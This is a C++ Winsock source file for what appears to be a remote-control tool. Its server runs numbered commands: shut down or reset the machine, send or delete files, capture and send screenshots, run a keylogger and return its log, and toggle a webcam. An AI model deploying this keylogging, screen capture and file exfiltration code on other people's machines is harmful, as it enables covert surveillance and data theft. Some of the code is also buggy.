#include "Socket.h"

bool initWinsock = false;
void InitWinsock(WSADATA& wsadata) {
	if (initWinsock) return;
	WSADATA wsaData;
	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "WSAStartup failed: %d\n";
		exit(1);
	}
	initWinsock = true;
}
void CloseWinsock() {
	if (!initWinsock) return;
	WSACleanup();
	initWinsock = false;
}
void ServerSocket::ProcessClientMessage() {
	//When result == "N"?
	int query = 0;
	int index = 0;
	bool sent = false;
	while (buffer[index] != '\0' && buffer[index] <= '9' && buffer[index] >= '0') {
		query = query * 10 + buffer[index] - '0';
		index++;
	}
	if (query == 17) {
		int shutdownStatus = ShutdownSystem();
		result = shutdownStatus == 0 ? "Y" : "N";
	}
	else if (query == 18) {
		int resetStatus = ResetSystem();
		result = resetStatus == 0 ? "Y" : "N";
	}
	else if (query == 20) {
		Receive();
		index = 0;
		string filePath = GetFilePath();
		fstream file(filePath, ios::binary | ios::in);
		if (!file.is_open()) {
			result = "N"; //File not found
		}
		else {
			file.seekg(0, ios::end);
			size_t fileSize = file.tellg();
			file.seekg(0, ios::beg);
			result = "F" + to_string(fileSize);
			Send();
			char fileBuffer[maxBufferSize];
			while (fileSize > 0 && fileSize >= maxBufferSize) {
				file.read(buffer, maxBufferSize);
				send(clientSocket, buffer, maxBufferSize, 0);
				fileSize -= maxBufferSize;
			}
			if (fileSize > 0) {
				file.read(buffer, fileSize);
				send(clientSocket, buffer, fileSize, 0);
			}
			file.close();
			sent = true;
		}
	}
	else if (query == 21) {
		Receive();
		index = 0;
		string filePath = GetFilePath();
		if (DeleteFile(filePath)) {
			result = "Y";
		}
		else {
			result = "N";
		}
	}
	else if (query == 22) {
		if (CaptureScreen()) {
			fstream file("_Data/Screenshot/screenshot.jpg", ios::binary | ios::in);
			file.seekg(0, ios::end);
			size_t fileSize = file.tellg();
			file.seekg(0, ios::beg);
			result = "F" + to_string(fileSize);
			Send();
			char fileBuffer[maxBufferSize];
			while (fileSize > 0 && fileSize >= maxBufferSize) {
				file.read(buffer, maxBufferSize);
				send(clientSocket, buffer, maxBufferSize, 0);
				fileSize -= maxBufferSize;
			}
			if (fileSize > 0) {
				file.read(buffer, fileSize);
				send(clientSocket, buffer, fileSize, 0);
			}
		}
		else {
			result = "N";
		}
	}
	else if (query == 23) {
		isKeyloggerOn = true;
		result = "Y";
	}
	else if (query == 24) {
		isKeyloggerOn = false;
		result = "Y";
	}
	else if (query == 25) {
		fstream file("_Data/KeyLogger/keylogger.txt", ios::binary | ios::in);
		if (!file.is_open() || !isKeyloggerOn) {
			cout << "Turn on keyLogger!" << endl; 
			result = "N";
		}
		else {
			file.seekg(0, ios::end);
			size_t fileSize = file.tellg();
			file.seekg(0, ios::beg);
			result = "F" + to_string(fileSize);
			Send();
			char fileBuffer[maxBufferSize];
			while (fileSize > 0 && fileSize >= maxBufferSize) {
				file.read(buffer, maxBufferSize);
				send(clientSocket, buffer, maxBufferSize, 0);
				fileSize -= maxBufferSize;
			}
			if (fileSize > 0) {
				file.read(buffer, fileSize);
				send(clientSocket, buffer, fileSize, 0);
			}
			file.close();
			sent = true;
		}
	}
	else if (query == 26) {
		isWebcamOn = true;
		result = "Y";
	}
	else if (query == 27) {
		isWebcamOn = false;
		result = "Y";
	}

	if (sent) return;
	Send();
}
void ServerSocket::TurnOn() {
	isKeyloggerOn = false;
	isWebcamOn = false;
	isServerOn = true;
	keyloggerThread = thread(Keylogger, ref(isKeyloggerOn), ref(isServerOn));
	webcamThread = thread(Webcam, ref(isWebcamOn), ref(isServerOn));
	GetServerAddrInfo();
	listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SetSocketOption();
	if (listenSocket == INVALID_SOCKET) {
		cout << "Socket creation failed: " << WSAGetLastError() << endl;
		WSACleanup();
	}
	BindSocket();
}
void ClientSocket::Receive() {
	int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
	if (bytesReceived > 0) {
		buffer[bytesReceived] = '\0';
		cout << "Message from server: " << buffer << endl;
		if (buffer[0] == 'F') {
			//file
			result = "";
			size_t fileSize = 0;
			int index = 1;
			while (buffer[index] != '\0') {
				fileSize = fileSize * 10 + buffer[index] - '0';
				index++;
			}
			while (fileSize - result.size() >= maxBufferSize) {
				recv(clientSocket, buffer, maxBufferSize, 0);
				for (int i = 0; i < maxBufferSize; i++) result += buffer[i];
			}
			int remainByte = fileSize - result.size();
			if (remainByte != 0) {
				recv(clientSocket, buffer, remainByte, 0);
				for (int i = 0; i < remainByte; i++) result += buffer[i];
			}
			result = base64_encode(result);
		}
		else if (buffer[0] == 'L') {
			//List app,...
		}
		else { //result == "Y" or "N"
			result = buffer[0];
		}
	}
	else if (bytesReceived == 0) {
		cout << "Connection closed" << endl;
	}
	else {
		cout << "Receive failed: " << WSAGetLastError() << endl;
	}
}

